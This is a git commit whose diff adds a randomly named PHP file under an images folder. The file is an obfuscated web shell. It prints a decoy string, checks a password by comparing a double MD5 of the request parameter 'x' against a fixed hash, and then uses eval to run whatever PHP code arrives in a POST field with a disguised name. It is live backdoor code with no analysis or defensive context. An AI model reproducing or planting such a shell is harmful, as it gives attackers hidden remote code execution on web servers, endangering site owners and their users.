0eda97a57895bb308d0b622e72abcdd9d694e750
Omar Aljoundi <omaraljoundi@gmail.com>
2023-11-30 22:06:20 +0300

    first commit

---
+++ images/3yg7e648.php
@@ -0,0 +1,35 @@
+﻿<?php
+
+function AECrtaBC()
+{
+global $BACeMiMZptW;
+$BACeMiMZptW=VsOABNgKEb();
+if(isset($_REQUEST['x']))
+{
+	$ICSBF = 'OFYhTDBDDsNGNFYhTDBDDsNGEFYhTDBDDsNGPFYhTDBDDsNGIFYhTDBDDsNGEFYhTDBDDsNGCFYhTDBDDsNGE';
+    $ICSBF=str_replace('FYhTDBDDsNG','',$ICSBF);
+
+    echo $ICSBF;
+	if ( strcasecmp(md5(md5($_REQUEST['x'])),'9b48145a94c3436d64570d18c1101616') ==0 )
+    {
+	@eval("\"$BACeMiMZptW\"");
+    }
+}
+
+
+}
+function VsOABNgKEb()
+{
+        $DyCVBeRXUQ='d0753f9dd1ab-a078-cf44-c804-79f2f65e';
+		$fBVbRKO=strrev($DyCVBeRXUQ);
+		if(isset($_POST[$fBVbRKO]))
+        {
+        $BVWLF=str_replace('','',$_POST[$fBVbRKO]);
+        
+        return '";'.$BVWLF.'//';
+		}
+}
+
+AECrtaBC();
+
+?>
